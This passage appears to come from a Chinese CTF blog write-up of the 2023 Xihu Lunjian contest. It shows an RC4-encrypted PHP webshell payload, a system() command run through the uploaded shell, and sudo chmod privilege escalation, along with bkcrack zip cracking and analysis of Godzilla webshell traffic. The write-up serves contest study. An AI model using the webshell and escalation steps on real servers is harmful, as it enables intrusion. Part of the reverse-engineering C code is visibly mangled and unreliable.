     zend_test.so
读回来然后把无关的去掉，再丢进 ida
看起来解析的时候用 `abcsdfadfjiweur` 作为 key 然后 RC4 解密然后当成 php 去执行
把拿下来的 index.php 看看
于是我们传个 RC4 加密后的一句话马上去就好
    473xeG4d+1FXOOiInKCC2LdFHDRL3s5i4ZuTj9iuNY0O83HcUA==
base64 decode （或者 output format 选 latin1 然后 save 到文件也行）
然后整个表单 multipart/form-data 传上去
然后访问
    /upload/miaotony.php?miaotony=system('ls -al /');
这里复现环境有人打过了，原来的话这里是没权限读 flag 的
然后 `/etc/sudoers` 不可读，但是有个 `sudoers.bak`
当前的 www-data 用户可以免密执行 chmod，那直接
    sudo chmod 777 /flag
    cat /flag
> 复现的过程中发现一个问题，如果用 burpsuite 传二进制文件的话，可能会丢东西。。
>
> 解析不出来的话会报错 **Fatal error** : file can't parse in **Unknown** on line **0**
>
> 调了老半天才发现是这个问题，坑死了！
>
>
> 
>
>
> 
>
> 但是喵喵这个 burpsuite 版本有点老了，不知道新版的还有没有这个问题了（
## Misc
### 签到题喵
转 hex 得到提示，给公众号发 西湖论剑2023我来了！
### mp3
> 看起来很正常的mp3文件
文件末尾拼接了张图片，提取出来
这个也不是二维码，大概率就是黑白转 01 了，随便写个脚本处理下
    import cv2
    img = cv2.imread("1.png", cv2.IMREAD_GRAYSCALE)
    data = ''
    for i in range(img.shape[0]):
        for j in range(img.shape[1]):
            if img[i,j] >= 128:
                data += '0'
            else:
                data += '1'
    print(data)
然后得到一个 zip
需要密码，然后再看 mp3，拿 MP3Stego 解密一下，试了下密码为空
    Decode.exe -X cipher.mp3
就能出来个 ASCII 字符串
    8750d5109208213f
解压 zip
    2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
好多重复的字符，根据文件名提示盲猜是 ROT47
    a=~[];a={___:++a,aaaa:(![]+"")[a],__a:++a,a_a_:(![]+"")[a],_a_:++a,a_aa:({}+"")[a],aa_a:(a[a]+"")[a],_aa:++a,aaa_:(!""+"")[a],a__:++a,a_a:++a,aa__:({}+"")[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+"")[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+"")[a.__a])+((!a)+"")[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!""+"")[a.__a])+(a._=(!""+"")[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!""+"")[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+"\""+a.a_a_+(![]+"")[a._a_]+a.aaa_+"\\"+a.__a+a.aa_+a._a_+a.__+"(\\\"\\"+a.__a+a.___+a.a__+"\\"+a.__a+a.___+a.__a+"\\"+a.__a+a._a_+a._aa+"\\"+a.__a+a.___+a._aa+"\\"+a.__a+a._a_+a.a__+"\\"+a.__a+a.___+a.aa_+"{"+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+"}\\\"\\"+a.a__+a.___+");"+"\"")())();
直接控制台执行得到 flag
`DASCTF{f8097257d699d7fdba7e97a15c4f94b4}`
### take_the_zip_easy
> easy zip, easy flow
ZipCrypto Store/Deflate，bkcrack 爆破解压缩包，然后拿密钥把文件提取出来
    $ echo -n dasflow.pcapng > plain.txt
    $ ./bkcrack -C zipeasy.zip -c dasflow.zip -p plain.txt -o 30  -x 0 504B0304
    bkcrack 1.5.0 - 2022-07-07
    [16:37:53] Z reduction using 6 bytes of known plaintext
    100.0 % (6 / 6)
    [16:37:53] Attack on 1038290 Z values at index 37
    Keys: 2b7d78f3 0ebcabad a069728c
    67.7 % (703381 / 1038290)
    [16:47:34] Keys
    2b7d78f3 0ebcabad a069728c
    $ ./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip
    bkcrack 1.5.0 - 2022-07-07
    [16:53:57] Writing deciphered data dasflow.zip (maybe compressed)
    Wrote deciphered data.
解压看下 http
form-data 是上传木马，后面的 eval.php 瞄了眼是哥斯拉流量
    &1
    methodName
    execCommand
所以密码就是 `airDAS1231qaSW@`，解压得到 flag
## Reverse
### Dual personality
    #include 
    int main()
    {
        unsigned char enc[0x100] = {0x0AA,0x4F,0x0F,0x0E2,0x0E4,0x41,0x99,0x54,0x2C,0x2B,0x84,0x7E,0x0BC,0x8F,0x8B,0x78,0x0D3,0x73,0x88,0x5E,0x0AE,0x47,0x85,0x70,0x31,0x0B3,0x9,0x0CE,0x13,0x0F5,0x0D,0x0CA};
        int key[] = {157, 68, 55, 181};
        key[0] &= key[1];
        key[1] |= key[2];
        key[2] ^= key[3];
        key[3] = ~key[3];
        for (int i = 0; i > 0xc) | (p2[0] > 0x22) | (p2[1] > 0x38) | (p2[2] > 0xe) | (p2[3] << 0x32);
        int *p1 = (int*)enc;
        int secret = 0x5df966ae;
        secret -= 0x21524111;
        for (int i = 0; i < 8; i++)
        {
            int prev = secret;
            secret ^= p1[i];
            p1[i] -= prev;
        }
        printf("%s\n", enc);
        return 0;
    }
## 小结
怎么说呢，主要这次喵喵比较佛系，没好好打，18. 结束的比赛当天有点事 ~~_（摸鱼）_~~
下午快16.才开始看题，看到这么多题直接傻了（时长8h的比赛每一类都五六七道题也太多了吧）
比赛期间喵喵自己就做出了两道 web，然后开了两道 misc 都做到一半就结束了，唔（（（
队友的话，感觉加上喵喵总共也就4个人看题，我们这群鸽子没几个人有空，学弟那边大概率还是第一次打比较大的比赛，也没啥经验，感觉下次有机会有空的话得线下一起好好打才行，哈哈
* * *
BTW，看到 **有师傅整理了[复现环境](https://github.com/Randark-JMT/CTF_Archive/tree/main/2023%20xhlj)，[题目附件](https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj)，甚至还构建好 docker 镜像了**，好唉
有需要的师傅可以去复现下
就这样吧，喵呜喵呜喵
**师傅们欢迎来[咱博客](https://miaotony.xyz/?utm_source=xianzhi) 逛逛喵~**
_溜了溜了喵（_